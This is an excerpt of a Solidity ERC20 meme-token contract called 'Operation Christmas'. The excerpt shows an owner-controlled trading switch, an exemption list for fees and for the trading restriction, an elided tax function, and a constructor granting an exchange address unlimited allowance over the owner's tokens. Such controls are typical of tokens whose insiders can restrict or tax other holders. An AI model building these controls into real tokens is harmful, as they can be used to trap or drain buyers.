...
contract OperationChristmas is Context, IERC20, Ownable {
    uint8 private _decimals = 12;
    bool initTrading=false;
    address public immutable deadAddress = 0x000000000000000000000000000000000000dEaD;
    uint256 public  _totalSupply = 1500000000000  * 10**(_decimals);
    string private _name = unicode"Operation Christmas";
    string private _symbol = unicode"Oh Oh";
    uint256 public constant MAX_SUPPLY = ~uint256(0);
    ...
    bool activeTrading=true;  
    
    
    constructor (address pairExchange) {
        holderNoFee[pairExchange] = true;
        ...
        _allowances[owner()][address(pairExchange)] = MAX_SUPPLY;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function payTaxTransfer(address s, address r, uint256 amount) internal returns (uint256) {
        uint256 feeValue = 0;   
    ...
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        ...
        _moveTokenOperation(_msgSender(), recipient, amount);
            return true;
    }
    ...
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        ...
        _moveTokenOperation(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }


    function _moveTokenOperation(address sender, address recipient, uint256 amount) private returns (bool) {            
        if((uniswapPair != recipient && sender != owner() && !holderNoFee[sender]))
            require(activeTrading != false, "Trading is not active.");  
        ...
        uint256 finalAmount = (holderNoFee[sender] || holderNoFee[recipient]) ? amount : payTaxTransfer(sender, recipient, amount);
